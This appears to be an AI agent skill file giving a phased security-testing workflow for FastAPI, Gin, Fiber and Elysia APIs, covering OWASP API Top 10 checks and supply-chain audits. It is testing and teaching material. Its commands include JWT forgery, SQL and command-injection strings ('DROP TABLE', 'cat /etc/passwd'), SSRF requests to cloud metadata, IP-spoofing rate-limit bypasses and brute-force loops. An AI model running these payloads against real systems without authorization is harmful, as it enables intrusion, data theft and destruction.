---
name: api-security-testing
description: "Standalone security testing workflow for REST and GraphQL APIs in Python
  (FastAPI), Go (Gin/Fiber), and TypeScript (Bun/Elysia). Covers OWASP API Top 10
  2023 test cases, authentication bypass, BOLA/IDOR, injection, rate limit testing,
  and supply chain auditing."
source: ValarMindSkills
---

# API Security Testing Workflow

## When to Use

Use this skill when:

- Testing a **FastAPI**, **Gin**, **Fiber**, or **Elysia** API for security issues
- Performing a pre-release security assessment
- Running a bug bounty engagement on an API target
- Verifying that security controls from `@api-security-best-practices` are effective
- Auditing a third-party or internal API before integration

This skill is **fully standalone** — it requires no other skills and contains all commands, payloads, and test cases needed.

## Testing Tools Setup

Install the following tools before starting:

| Tool | Purpose | Install |
|---|---|---|
| **Bruno** | Git-friendly API client (`.bru` files versionable in repo) | `npm i -g @usebruno/cli` or desktop app |
| **Hoppscotch** | Browser-based API client, no install required | hoppscotch.io |
| **k6** | Load and rate limit testing as-code | `brew install k6` |
| **httpx** (CLI) | Fast HTTP requests for scripting and one-liners | `pip install httpx[cli]` |
| **govulncheck** | CVE scan for Go module dependencies | `go install golang.org/x/vuln/cmd/govulncheck@latest` |
| **pip-audit** | CVE scan for Python package dependencies | `pip install pip-audit` |
| **jwt_tool** | JWT manipulation and attack tool | `git clone https://github.com/ticarpi/jwt_tool` |

## Pre-Testing Checklist

Before running any tests:

- [ ] Map all endpoints — use OpenAPI/Swagger spec if available (`/openapi.json`, `/swagger.json`)
- [ ] List all API versions exposed (`/v1/`, `/v2/`, `/beta/`, `/legacy/`)
- [ ] Identify authentication vs. public endpoints
- [ ] Note expected HTTP methods per endpoint
- [ ] Check if API docs are exposed in production (see framework-specific checks below)
- [ ] Confirm you have authorization to test (pentest agreement, bug bounty scope)

**Framework-specific flags to check before testing:**

| Framework | Production Risk | Check |
|---|---|---|
| FastAPI | `/docs`, `/redoc`, `/openapi.json` exposed | `curl https://target/docs` → should return 404 |
| Gin | Debug mode active | `GIN_MODE` env var should be `release` |
| Fiber | Prefork mode or Helmet missing | Review middleware stack |
| Elysia | Bun runtime exposes raw errors | Verify global error handler is in place |

## Phase 1: Authentication Testing

### 1.1 Basic Token Tests

```bash
# No token — expect 401
httpx POST https://target/api/protected

# Expired token — expect 401 (not 403)
httpx POST https://target/api/protected -H "Authorization: Bearer <expired_token>"

# Token from a different user — expect 403
httpx GET https://target/api/users/user_a_id -H "Authorization: Bearer <user_b_token>"
```

Expected: `401` for missing/expired tokens, `403` for valid but unauthorized tokens.

### 1.2 JWT Algorithm Confusion Attacks

```bash
# Using jwt_tool — test alg:none attack
python3 jwt_tool.py <token> -X a

# RS256 → HS256 confusion (sign with server's public key as HMAC secret)
python3 jwt_tool.py <token> -X s -pk server_public.pem
```

Both attacks should return `401` or `403`, never a successful response.

### 1.3 JWT Claim Manipulation

```bash
# Manually modify payload claims using jwt_tool
python3 jwt_tool.py <token> -T  # interactive tamper mode

# Try elevating role
python3 jwt_tool.py <token> -I -pc role -pv admin

# Try changing sub/userId to another user
python3 jwt_tool.py <token> -I -pc sub -pv other_user_id
```

### 1.4 OAuth / PKCE Tests

```bash
# If the authorization server supports PKCE, test PKCE downgrade:
# Remove code_challenge and code_challenge_method from the authorization request.
# The server MUST reject this if PKCE is enforced for all clients.
GET /oauth/authorize?client_id=app&response_type=code&redirect_uri=...
# (no code_challenge parameter)
# Expected: 400 Bad Request or redirect with error=invalid_request
```

### 1.5 Refresh Token Reuse Detection

```bash
# Step 1: Exchange refresh_token_1 for new tokens → receive refresh_token_2
httpx POST https://target/auth/refresh \
  -d '{"refresh_token": "refresh_token_1"}'

# Step 2: Attempt to use refresh_token_1 again
httpx POST https://target/auth/refresh \
  -d '{"refresh_token": "refresh_token_1"}'
# Expected: 401 — and ideally the ENTIRE token family is revoked (refresh_token_2 also invalid)
```

## Phase 2: Authorization — BOLA / IDOR Testing

BOLA (Broken Object Level Authorization) = API1:2023. The most common critical API vulnerability.

### 2.1 Setup: Two Test Users

Create two accounts before testing:
- `user_a` with their own resources (posts, orders, profiles, etc.)
- `user_b` with separate resources

### 2.2 Cross-User Resource Access

```bash
# With user_b token, attempt to access user_a's resource by ID
httpx GET https://target/api/orders/user_a_order_id \
  -H "Authorization: Bearer <user_b_token>"
# Expected: 403 Forbidden or 404 Not Found

# Test ID enumeration — try sequential or predictable IDs
httpx GET https://target/api/users/1 -H "Authorization: Bearer <user_b_token>"
httpx GET https://target/api/users/2 -H "Authorization: Bearer <user_b_token>"
httpx GET https://target/api/users/3 -H "Authorization: Bearer <user_b_token>"
```

### 2.3 Over-Fetching (API3:2023 — Broken Object Property Level Authorization)

```bash
# Check if the response includes private fields that should not be returned
httpx GET https://target/api/users/profile -H "Authorization: Bearer <user_b_token>"

# Look for: password_hash, internal_notes, admin_flags, stripe_customer_id,
#           ssn, dob, ip_address, raw_token, internal_user_id
```

### 2.4 Mass Assignment (API3:2023)

```bash
# Send unexpected fields in a write request — check if they are silently accepted
httpx POST https://target/api/users/profile/update \
  -H "Authorization: Bearer <user_token>" \
  -d '{"name": "Alice", "role": "admin", "is_verified": true, "credits": 99999}'
# Expected: role/is_verified/credits should be ignored, not persisted
```

### 2.5 Function Level Authorization — Admin Endpoints (API5:2023)

```bash
# Test admin endpoints with a regular user token
httpx GET https://target/api/admin/users -H "Authorization: Bearer <regular_user_token>"
httpx DELETE https://target/api/admin/users/123 -H "Authorization: Bearer <regular_user_token>"
httpx POST https://target/api/admin/impersonate -H "Authorization: Bearer <regular_user_token>"
# All should return 403
```

### 2.6 Multi-Tenant Isolation

```bash
# With tenant_a token, try to access tenant_b's resources
httpx GET https://target/api/tenants/tenant_b_id/data \
  -H "Authorization: Bearer <tenant_a_token>"
# Expected: 403 or 404 — never tenant_b's data
```

## Phase 3: Input Injection Testing

### 3.1 SQL Injection

```bash
# Basic payload — test in query params and path params
httpx GET "https://target/api/users?id=1' OR '1'='1"
httpx GET "https://target/api/users?name=admin'--"
httpx GET "https://target/api/search?q='; DROP TABLE users--"

# Time-based blind SQLi (PostgreSQL)
httpx GET "https://target/api/users?id=1; SELECT pg_sleep(5)--"
# If response takes >5s, the endpoint is vulnerable
```

### 3.2 NoSQL Injection

```bash
# MongoDB-style operator injection
httpx POST https://target/api/auth/login \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

httpx GET "https://target/api/users?filter[$where]=1==1"
```

### 3.3 Command Injection

```bash
httpx POST https://target/api/tools/ping -d '{"host": "127.0.0.1; cat /etc/passwd"}'
httpx POST https://target/api/tools/ping -d '{"host": "127.0.0.1 | id"}'
httpx POST https://target/api/export -d '{"filename": "report; ls -la"}'
```

### 3.4 SSRF

```bash
# Internal infrastructure access
httpx POST https://target/api/fetch -d '{"url": "http://localhost:8080/admin"}'
httpx POST https://target/api/fetch -d '{"url": "http://169.254.169.254/latest/meta-data/"}'  # AWS metadata
httpx POST https://target/api/fetch -d '{"url": "http://192.168.1.1"}'  # internal network
httpx POST https://target/api/fetch -d '{"url": "file:///etc/passwd"}'  # local file read

# Redirect bypass attempts
httpx POST https://target/api/fetch -d '{"url": "https://attacker.com/redirect-to-internal"}'
```

### 3.5 Framework-Specific Injection Checks

**FastAPI / Pydantic (CVE-2024-3772 ReDoS)**

```bash
# Test with a crafted long email string — pydantic < 2.4.0 hangs on this
# Generate a long malformed email:
python3 -c "print('a' * 200 + '@' + 'b' * 200 + '.c' * 50)"
# Submit as email field — measure response time; timeout suggests vulnerable version
```

**Elysia / TypeBox — strict mode check**

```bash
# Send extra fields not in the schema
httpx POST https://target/api/users \
  -d '{"name": "Alice", "role": "admin", "__proto__": {"isAdmin": true}}'
# If additionalProperties: false is set, extra fields are stripped/rejected
# If they appear in the response or affect behavior, TypeBox strict mode is missing
```

## Phase 4: Rate Limiting Testing

### 4.1 Basic Rate Limit Verification

```bash
# Send N+1 requests — the last one should return 429
for i in $(seq 1 101); do
  httpx GET https://target/api/data -H "Authorization: Bearer <token>"
done
# Expect 429 on the 101st request (if limit is 100/min)
```

### 4.2 Rate Limit Header Check

```bash
httpx GET https://target/api/data -H "Authorization: Bearer <token>" -v
# Expected headers in response:
# X-RateLimit-Limit: 100
# X-RateLimit-Remaining: 99
# X-RateLimit-Reset: <timestamp>
# On 429: Retry-After: <seconds>
```

### 4.3 IP Spoofing Bypass Attempts

```bash
# Test if rate limiting can be bypassed by spoofing IP headers
httpx GET https://target/api/auth/login \
  -H "X-Forwarded-For: 1.2.3.4" \
  -d '{"email": "admin@example.com", "password": "wrong"}'

# Rotate the spoofed IP on each request — if rate limit resets, the server is trusting X-Forwarded-For
for i in $(seq 1 20); do
  httpx POST https://target/api/auth/login \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"email": "admin@example.com", "password": "wrong"}'
done
```

### 4.4 k6 Burst Test

```javascript
// burst_test.js — run with: k6 run burst_test.js
import http from "k6/http";
import { check } from "k6";

export const options = {
  vus: 100,
  duration: "10s",
};

export default function () {
  const res = http.post("https://target/api/auth/login", JSON.stringify({
    email: "test@example.com",
    password: "wrongpassword",
  }), { headers: { "Content-Type": "application/json" } });

  check(res, {
    "rate limited after threshold": (r) => r.status === 429 || r.status === 401,
  });
}
// All requests after the limit threshold should return 429, not 200 or 500
```

### 4.5 Authentication Endpoint Brute Force

```bash
# Auth endpoints should have strict limits (≤ 5 attempts per 15 min)
for i in $(seq 1 10); do
  httpx POST https://target/api/auth/login \
    -d "{\"email\": \"admin@example.com\", \"password\": \"attempt_$i\"}"
done
# Expect 429 from attempt 6 onward
```

## Phase 5: Information Disclosure & Error Handling

### 5.1 Malformed Requests

```bash
# Send invalid JSON
httpx POST https://target/api/users \
  -H "Content-Type: application/json" \
  -d '{"broken json'

# Send wrong Content-Type
httpx POST https://target/api/users \
  -H "Content-Type: text/xml" \
  -d '<user><name>Alice</name></user>'

# Expected: generic 400 error, no stack traces
```

### 5.2 Technology Version Disclosure

```bash
httpx GET https://target/api/health -v 2>&1 | grep -E "Server:|X-Powered-By:|X-AspNet|x-runtime"
# None of these headers should reveal framework name + version
# Example bad: "Server: uvicorn/0.29.0" → reveals Python/FastAPI version
```

### 5.3 Timing Oracle (Resource Existence Enumeration)

```bash
# Time request for a resource you own vs. a resource that does not exist
time httpx GET https://target/api/posts/your_post_id -H "Authorization: Bearer <token>"
time httpx GET https://target/api/posts/nonexistent_id -H "Authorization: Bearer <token>"

# If the timing difference is >100ms, the endpoint may reveal resource existence
# Both should return identical timing and the same status code (404 or 403)
```

### 5.4 GraphQL Introspection

```bash
httpx POST https://target/graphql \
  -d '{"query": "{ __schema { types { name } } }"}'
# Expected in production: 400 Bad Request or { "errors": [{ "message": "introspection disabled" }] }
# If introspection returns full schema, it is a misconfiguration
```

### 5.5 FastAPI Documentation Exposure Check

```bash
httpx GET https://target/docs      # should return 404 in production
httpx GET https://target/redoc     # should return 404 in production
httpx GET https://target/openapi.json  # should return 404 in production
```

## Phase 6: Supply Chain Audit

### Python

```bash
# Install and run pip-audit against current environment
pip install pip-audit
pip-audit

# Or scan a requirements file directly
pip-audit -r requirements.txt

# Expected output: "No known vulnerabilities found"
# If vulnerabilities exist, review severity before deploying
```

### Go

```bash
# Verify go.sum integrity
go mod verify

# Scan for CVEs in all dependencies
govulncheck ./...

# Expected: "No vulnerabilities found."
```

### Bun / Node

```bash
# Check for vulnerabilities in package.json dependencies
bun audit
# or
npm audit --audit-level=high

# Verify lockfile is present and committed
ls -la bun.lockb  # or package-lock.json / yarn.lock

# In CI: ensure --frozen-lockfile is used so installs are deterministic
bun install --frozen-lockfile
```

## Phase 7: CORS & Security Headers

### 7.1 CORS Origin Reflection Test

```bash
# Test if the server reflects arbitrary origins
httpx GET https://target/api/user/profile \
  -H "Origin: https://evil.example.com" \
  -H "Authorization: Bearer <token>" -v

# Check response headers:
# BAD:  Access-Control-Allow-Origin: https://evil.example.com  (reflected)
# BAD:  Access-Control-Allow-Origin: *
# GOOD: Access-Control-Allow-Origin: https://app.example.com  (allowlist only)
```

### 7.2 Credentials + Wildcard Combination

```bash
# This combination is forbidden by the CORS spec but some servers misconfigure it
httpx OPTIONS https://target/api/data \
  -H "Origin: https://evil.example.com" \
  -H "Access-Control-Request-Method: GET" -v

# If response contains both of these headers simultaneously, it is a critical misconfiguration:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
```

### 7.3 Security Headers Checklist

```bash
# Run a header check against the API base URL
httpx GET https://target/ -v 2>&1 | grep -E \
  "Strict-Transport-Security|X-Frame-Options|X-Content-Type-Options|Content-Security-Policy|Referrer-Policy"

# Each of the following should be present:
# Strict-Transport-Security: max-age=31536000; includeSubDomains
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Content-Security-Policy: default-src 'self'
```

## Framework-Specific Security Checks

### FastAPI

```bash
# 1. Critical CORS misconfiguration (CVE-2025-34291 class)
grep -r "allow_origins.*\*" .  # should return nothing in production config
grep -r "allow_credentials.*True" .  # if present, verify origins are NOT wildcard

# 2. Docs disabled in production
grep -r "docs_url" .  # should be: FastAPI(docs_url=None, redoc_url=None)

# 3. Startup validation
grep -r "DEBUG" .  # no debug=True in production settings
```

### Gin

```bash
# 1. Debug mode check
grep -r "gin.Default()\|gin.DebugMode\|GIN_MODE" .
# Production should use: gin.SetMode(gin.ReleaseMode)

# 2. CORS explicitly configured
grep -r "AllowAllOrigins\|cors.Default()" .  # should not be present
```

### Fiber

```bash
# 1. Helmet middleware presence
grep -r "helmet" . --include="*.go"  # should be imported and used

# 2. CORS without wildcard + credentials
grep -r 'AllowOrigins.*"\*"' . --include="*.go"  # should not appear alongside AllowCredentials: true
```

### Elysia

```bash
# 1. Bearer plugin — verify JWT validation is explicit (bearer only extracts the token)
grep -r "@elysiajs/bearer\|bearer()" . --include="*.ts"
# For every use of bearer(), there should be a corresponding jwt.verify() call

# 2. TypeBox strict mode — additionalProperties
grep -r "additionalProperties" . --include="*.ts"
# t.Object schemas should include { additionalProperties: false }
```

## Test Report Template

For each finding, document:

| Field | Content |
|---|---|
| **Vulnerability ID** | VULN-001 (sequential) |
| **Severity** | Critical / High / Medium / Low / Informational |
| **OWASP Category** | e.g., API1:2023 BOLA, API4:2023 Unrestricted Resource Consumption |
| **Affected Endpoint** | `POST /api/auth/login` |
| **HTTP Method** | POST |
| **Evidence** | Request + Response (sanitize sensitive data) |
| **Impact** | What an attacker can achieve |
| **Remediation** | Specific fix for the framework in use |
| **References** | CVE, CWE, OWASP link |

### Severity Reference

| Severity | CVSS Range | Example |
|---|---|---|
| **Critical** | 9.0–10.0 | BOLA returning any user's data, auth bypass |
| **High** | 7.0–8.9 | SQLi, SSRF reaching internal services, missing auth on endpoints |
| **Medium** | 4.0–6.9 | Missing rate limiting, CORS misconfiguration, sensitive fields in response |
| **Low** | 1.0–3.9 | Version disclosure, missing security headers |
| **Informational** | N/A | Docs exposed in staging, debug logs |

## Related Skills

- `@api-security-best-practices` — security controls to implement based on findings from this testing workflow
- `@web-vulnerabilities` — reference for injection, XSS, CSRF, and other web vulnerabilities
